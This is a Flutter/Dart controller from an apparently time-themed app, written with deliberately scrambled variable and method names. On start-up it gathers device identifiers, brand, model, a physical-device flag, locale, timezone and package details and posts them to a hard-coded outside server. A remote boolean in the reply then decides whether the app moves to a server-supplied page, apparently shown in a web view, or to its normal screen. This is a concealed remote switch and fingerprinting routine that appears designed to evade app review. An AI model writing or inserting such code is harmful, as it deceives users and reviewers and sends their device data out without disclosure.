import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:get/get.dart';
import 'package:dio/dio.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';

import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class TimeControllLogic extends GetxController {

  var wqionetsa = RxBool(false);
  var hfzexcig = RxBool(true);
  var junkz = RxString("");
  var caleigh = RxBool(false);
  var paucek = RxBool(true);
  final wgzebax = Dio();


  InAppWebViewController? webViewController;

  dynamic vifmhcekx(){
    final fjthenqm = InternetConnectionChecker.instance;
    final ansqtcrf = fjthenqm.onStatusChange.skip(1).listen(
          (InternetConnectionStatus drvkpfx) {
        if (drvkpfx == InternetConnectionStatus.connected) {
          knulme();
        } else {
          Get.toNamed('/time_reload')?.then((_){
            knulme();
          });
        }
      },
    );
    return ansqtcrf;
  }

  Future<bool> ghjvsrp() async {
    var yiawvxr = await InternetConnectionChecker.instance.hasConnection;
    if(!yiawvxr){
      Get.toNamed('/time_reload')?.then((_){
        knulme();
      });
    }
    return yiawvxr;
  }

  @override
  void onInit() {
    super.onInit();
    vifmhcekx();
    knulme();
  }


  Future<void> knulme() async {

    var mhazcg = await ghjvsrp();
    if(!mhazcg){
      return;
    }

    caleigh.value = true;
    paucek.value = true;
    hfzexcig.value = false;

    wgzebax.post("https://oi.vzeus.net/WbhFW1jHnBNhv",data: await sdqxny()).then((value) {
      var cbzrhx = value.data["cbzrhx"] as String;
      var rskbdu = value.data["rskbdu"] as bool;
      if (rskbdu) {
        SystemChrome.setPreferredOrientations([
          DeviceOrientation.portraitUp,
          DeviceOrientation.portraitDown,
        ]);
        junkz.value = cbzrhx;
        lucious();
      } else {
        russel();
      }
    }).catchError((e) {
      hfzexcig.value = true;
      paucek.value = true;
      caleigh.value = false;
    });
  }

  Future<Map<String, dynamic>> sdqxny() async {
    final DeviceInfoPlugin mcrifloq = DeviceInfoPlugin();
    PackageInfo ahfdgpb_glybq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ecat = Platform.localeName;
    var IUAG = currentTimeZone;

    var YvIV = ahfdgpb_glybq.packageName;
    var hIMpZbfd = ahfdgpb_glybq.version;
    var SiEYtZ = ahfdgpb_glybq.buildNumber;

    var jCyMch = ahfdgpb_glybq.appName;
    var jrJWf = "";
    var QKma  = "";
    var GKtZMQh = "";
    var aldenHeller = "";
    var halleStanton = "";
    var arielYost = "";
    var marcelinaCollier = "";


    var CWOJc = "";
    var VyWOH = false;

    if (GetPlatform.isAndroid) {
      CWOJc = "android";
      var gicdqsf = await mcrifloq.androidInfo;

      GKtZMQh = gicdqsf.brand;

      jrJWf  = gicdqsf.model;
      QKma = gicdqsf.id;

      VyWOH = gicdqsf.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      CWOJc = "ios";
      var lsuqpgd = await mcrifloq.iosInfo;
      GKtZMQh = lsuqpgd.name;
      jrJWf = lsuqpgd.model;

      QKma = lsuqpgd.identifierForVendor ?? "";
      VyWOH  = lsuqpgd.isPhysicalDevice;
    }
    var res = {
      "SiEYtZ": SiEYtZ,
      "marcelinaCollier" : marcelinaCollier,
      "hIMpZbfd": hIMpZbfd,
      "YvIV": YvIV,
      "halleStanton" : halleStanton,
      "CWOJc": CWOJc,
      "jrJWf": jrJWf,
      "IUAG": IUAG,
      "jCyMch": jCyMch,
      "GKtZMQh": GKtZMQh,
      "QKma": QKma,
      "ecat": ecat,
      "VyWOH": VyWOH,
      "aldenHeller" : aldenHeller,
      "arielYost" : arielYost,

    };
    return res;
  }

  Future<void> russel() async {
    Get.offNamed("/time_main");
  }

  Future<void> lucious() async {
    Get.offNamed("/time_init");
  }

  @override
  void dispose() {
    vifmhcekx().cancel();
    super.dispose();
  }

}
